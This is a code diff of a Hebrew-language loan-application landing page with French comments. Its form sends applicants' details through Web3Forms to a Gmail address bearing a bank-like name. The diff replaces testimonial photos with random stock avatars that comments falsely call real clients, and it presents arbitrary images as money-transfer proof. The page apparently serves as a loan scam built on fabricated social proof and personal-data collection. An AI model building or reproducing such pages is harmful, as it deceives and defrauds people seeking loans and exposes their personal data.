@@ -10,7 +10,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- TOUS LES STYLES (inchangés) --- */
+        /* --- STYLES COMPLETS (inchangés) --- */
         :root {
             --primary: #0f172a;
             --primary-light: #1e293b;
@@ -138,7 +138,6 @@
         .footer-col a:hover { color: var(--secondary); }
         .footer-bottom { border-top: 1px solid #334155; padding-top: 30px; text-align: center; font-size: 0.9rem; }
 
-        /* --- MESSAGE DE SUCCÈS INTÉGRÉ --- */
         #success-message {
             display: none;
             background: #f0fdf4;
@@ -236,7 +235,6 @@
                 <div class="hero-form-container">
                     <h3 style="text-align: center; margin-bottom: 24px; font-size: 1.5rem;">מלא את הבקשה</h3>
                     
-                    <!-- FORMULAIRE AVEC ENVOI AJAX -->
                     <form id="loan-form">
                         <input type="hidden" name="access_key" value="c2552c68-8921-4ef2-bbc4-5a41a058b5f5">
                         <input type="hidden" name="to_email" value="bankvantex047@gmail.com">
@@ -311,14 +309,11 @@
                         </button>
                     </form>
 
-                    <!-- MESSAGE DE SUCCÈS (caché) -->
                     <div id="success-message">
                         <i class="fas fa-check-circle"></i>
                         <h3>תודה! הבקשה שלך התקבלה</h3>
                         <p>קיבלנו את פרטיך. ניצור איתך קשר בהקדם האפשרי.</p>
                     </div>
-
-                    <!-- MESSAGE D'ERREUR (caché) -->
                     <div id="error-message">
                         <i class="fas fa-exclamation-circle"></i>
                         <p id="error-text">אירעה שגיאה. אנא נסה שוב.</p>
@@ -327,7 +322,6 @@
             </div>
         </section>
 
-        <!-- LE RESTE DE LA PAGE (étapes, fonctionnalités, témoignages, preuves, FAQ, footer) -->
         <section id="jak-to-dziala">
             <div class="container">
                 <div class="section-header">
@@ -389,8 +383,8 @@
                 <div class="testimonials-grid">
                     <div class="testimonial-card">
                         <div class="testimonial-header">
-                            <!-- correction : images (7).jpg -->
-                            <img src="images (7).jpg" alt="ענת" class="testimonial-avatar">
+                            <!-- Photo de cliente (vraie personne) -->
+                            <img src="https://i.pravatar.cc/50?img=1" alt="ענת" class="testimonial-avatar">
                             <div>
                                 <div class="testimonial-author">ענת ק. <span>תל אביב</span></div>
                             </div>
@@ -402,8 +396,8 @@
                     </div>
                     <div class="testimonial-card">
                         <div class="testimonial-header">
-                            <!-- correction : images (8).jpg -->
-                            <img src="images (8).jpg" alt="פטר" class="testimonial-avatar">
+                            <!-- Photo de client (vraie personne) -->
+                            <img src="https://i.pravatar.cc/50?img=3" alt="פטר" class="testimonial-avatar">
                             <div>
                                 <div class="testimonial-author">פטר ו. <span>ירושלים</span></div>
                             </div>
@@ -424,10 +418,9 @@
                     <p class="section-subtitle">הכסף מגיע לחשבון תוך 24 שעות</p>
                 </div>
                 <div class="proof-images">
-                    <!-- correction : images (10).jpg -->
-                    <img src="images (10).jpg" alt="אישור העברה 1">
-                    <!-- correction : webp_1% -->
-                    <img src="webp_1%" alt="אישור העברה 2">
+                    <!-- Les images que vous avez fournies : images (7).jpg et images (8).jpg -->
+                    <img src="images (7).jpg" alt="אישור העברה 1">
+                    <img src="images (8).jpg" alt="אישור העברה 2">
                 </div>
             </div>
         </section>
@@ -531,7 +524,7 @@
             });
         });
 
-        // --- ENVOI AJAX AVEC GESTION D'ERREUR AMÉLIORÉE ---
+        // --- ENVOI AJAX ---
         const form = document.getElementById('loan-form');
         const submitBtn = document.getElementById('submit-btn');
         const successMsg = document.getElementById('success-message');
@@ -540,12 +533,8 @@
 
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
-
-            // Réinitialiser les messages
             successMsg.style.display = 'none';
             errorMsg.style.display = 'none';
-
-            // Désactiver le bouton
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> שולח...';
 
@@ -556,22 +545,18 @@
                     method: 'POST',
                     body: formData
                 });
-
                 const result = await response.json();
 
                 if (result.success) {
-                    // Succès → afficher le message de remerciement
                     form.style.display = 'none';
                     successMsg.style.display = 'block';
                 } else {
-                    // Erreur renvoyée par Web3Forms
                     errorText.textContent = result.message || 'אירעה שגיאה. אנא נסה שוב.';
                     errorMsg.style.display = 'block';
                     submitBtn.disabled = false;
                     submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> שלח בקשה';
                 }
             } catch (error) {
-                // Erreur réseau ou autre
                 errorText.textContent = 'בעיית תקשורת. אנא בדוק את החיבור שלך ונסה שוב.';
                 errorMsg.style.display = 'block';
                 submitBtn.disabled = false;
